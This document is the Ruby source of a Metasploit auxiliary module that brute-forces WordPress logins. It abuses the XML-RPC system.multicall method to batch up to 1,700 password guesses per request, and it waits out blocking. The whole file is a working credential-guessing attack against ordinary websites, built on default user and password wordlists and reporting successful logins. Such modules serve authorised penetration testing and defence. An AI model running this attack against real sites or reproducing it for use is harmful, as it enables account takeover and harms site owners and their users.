##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/wordpress_multicall'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'Wordpress XML-RPC system.multicall Credential Collector',
      'Description'  => %q{
        This module attempts to find Wordpress credentials by abusing the XMLRPC
        APIs. Wordpress versions prior to 4.4.1 are suitable for this type of
        technique. For newer versions, the script will drop the CHUNKSIZE to 1 automatically.
      },
      'Author'      =>
        [
          'KingSabri <King.Sabri[at]gmail.com>' ,
          'William <WCoppola[at]Lares.com>',
          'sinn3r'
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['URL', 'https://blog.cloudflare.com/a-look-at-the-new-wordpress-brute-force-amplification-attack/' ],
          ['URL', 'https://blog.sucuri.net/2014/07/new-brute-force-attacks-exploiting-xmlrpc-in-wordpress.html' ]
        ],
      'DefaultOptions' =>
        {
          'USER_FILE' => File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt"),
          'PASS_FILE' => File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt")
        }
    ))

    register_options(
      [
        OptInt.new('BLOCKEDWAIT', [ true, 'Time(minutes) to wait if got blocked', 6 ]),
        OptInt.new('CHUNKSIZE',   [ true, 'Number of passwords need to be sent per request. (1700 is the max)', 1500 ]),
      ])

    # Not supporting these options, because we are not actually letting the API to process the
    # password list for us. We are doing that in Metasploit::Framework::LoginScanner::WordpressRPC.
    deregister_options(
      'BLANK_PASSWORDS', 'PASSWORD', 'USERPASS_FILE', 'USER_AS_PASS', 'DB_ALL_CREDS', 'DB_ALL_PASS', 'PASSWORD_SPRAY'
      )
  end

  def passwords
    File.readlines(datastore['PASS_FILE']).lazy.map {|pass| pass.chomp}
  end

  def check_options
    if datastore['CHUNKSIZE'] > 1700
      fail_with(Failure::BadConfig, 'Option CHUNKSIZE cannot be larger than 1700')
    end
  end

  def setup
    check_options
  end

  def check_setup
    version = wordpress_version
    vprint_good("Found Wordpress version: #{version}")

    if !wordpress_and_online?
      print_error("#{peer}:#{rport}#{target_uri} does not appear to be running Wordpress or you got blocked! (Do Manual Check)")
      false
    elsif !wordpress_xmlrpc_enabled?
      print_error("#{peer}:#{rport}#{wordpress_url_xmlrpc} does not enable XMLRPC")
      false
    elsif Gem::Version.new(version) >= Gem::Version.new('4.4.1')
      print_error("#{peer}#{wordpress_url_xmlrpc} Target's version (#{version}) is not vulnerable to this attack.")
      vprint_status("Dropping CHUNKSIZE from #{datastore['CHUNKSIZE']} to 1")
      datastore['CHUNKSIZE'] = 1
      true
    else
      print_status("Target #{peer} is running Wordpress")
      true
    end
  end

  def run_host(ip)
    if check_setup
      print_status("XMLRPC enabled, Hello message received!")
    else
      print_error("Abborting the attack.")
      return
    end

    print_status("#{peer} - Starting XML-RPC login sweep...")

    cred_collection = Metasploit::Framework::CredentialCollection.new(
        blank_passwords: true,
        user_file: datastore['USER_FILE'],
        username: datastore['USERNAME']
    )

    scanner = Metasploit::Framework::LoginScanner::WordpressMulticall.new(
      configure_http_login_scanner(
        passwords: passwords,
        chunk_size: datastore['CHUNKSIZE'],
        block_wait: datastore['BLOCKEDWAIT'],
        base_uri: target_uri.path,
        uri: wordpress_url_xmlrpc,
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 5,
        http_username: datastore['HttpUsername'],
        http_password: datastore['HttpPassword']
      )
    )

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
          module_fullname: self.fullname,
          workspace_id: myworkspace_id
      )

      case result.status
        when Metasploit::Model::Login::Status::SUCCESSFUL
          print_brute :level => :vgood, :ip => ip, :msg => "SUCCESSFUL: #{result.credential}"
      end
    end

  end
end
